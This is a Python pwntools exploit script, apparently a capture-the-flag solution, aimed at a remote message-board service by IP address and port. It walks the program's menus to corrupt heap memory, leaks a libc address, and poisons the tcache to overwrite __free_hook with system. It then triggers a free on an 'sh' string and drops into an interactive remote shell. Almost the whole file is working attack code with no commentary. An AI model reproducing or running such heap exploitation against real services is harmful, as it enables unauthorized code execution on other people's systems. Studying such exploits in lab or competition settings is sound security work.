from pwn import *

HOST, PORT = "178.128.87.12", "31337"
# HOST, PORT = "192.168.137.137", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(":")
ii = lambda x: r.sendline(str(x))
go = lambda x, nl=True: (menu(), ii(x))[0] if nl else (menu(), r.send(str(x)))
c = lambda: r.recvuntil('?')

def register(id, pw, desc, nl=True):
	go(1)
	go(id)
	go(pw, nl)
	go(desc)

def login(id, pw):
	go(2)
	go(id)
	go(pw)

map = False
rnd = '\x00' * 32

def addmsg(name, clen, content, addr=None):
	go(1)
	go(name)
	go(clen)
	go(content)
	if map and addr is not None:
		r.send(p64(addr) * 2)
		r.send(rnd)

def editmsg(index, clen, content):
	go(3)
	c()
	ii(index)
	go(clen)
	go(content)

def delmsg(index):
	go(2)
	c()
	ii(index)

register('a', '0', 'hey')
register('b', '1', 'yo')
register('c', '2', 'yo')
login('a', '0')
addmsg('a', 100, 'a')
go(5)
register('target', 'a' * 32, '!', False)
login('a', '0')
map = True
menu()
data = 0x41410000
addmsg('a', 101, 'yo', data)
addmsg('a', 101, 'yo', data - 0x2000)
addmsg('a', 0x1001, 'yo', data - 0x4000)
addmsg('a', 0x1001, 'yo', data + 0x1000)
go(4)
r.recvuntil('4 - ')
r.recvline()
r.recvn(14)
libcaddr = r.recvn(14).decode('hex').ljust(8, '\x00')
libcaddr = u64(libcaddr)
print hex(libcaddr)
print r.recvline()

libc = ELF('libc.so.6')
libc.address = libcaddr - 0x3ebca0
print hex(libc.address)
payload = p32(0x30) + p32(1) + p64(data - 0x1000 + 0x40) + 'a' * 32
# heap chunk
chunk = p64(0) + p64(0x31) + 'a' * 0x30 + p64(0x11)
editmsg(2, 0x2000, chunk.ljust(0x1000 - 0x30) + payload)
editmsg(2, 0x1800, 'a' * (0x1000 - 0x30) + p32(0x2000) + p32(1) + p64(data) + 'a' * 32 + chunk)
# message 1 is modified
editmsg(3, 0x100, p64(0x11) * 8)
pause()
delmsg(1)
target = libc.symbols['__free_hook']
new_chunk = p64(0) + p64(0x101) + p64(target)
editmsg(1, 0x1000, new_chunk)
editmsg(1, 0x2000, new_chunk)
pause()
rnd = p64(libc.symbols['system']).ljust(32, '\x00')
addmsg('a', 0x20, 'sh #', data + 0x10000) # tcache bin is replaced to target
r.interactive()
# editmsg()


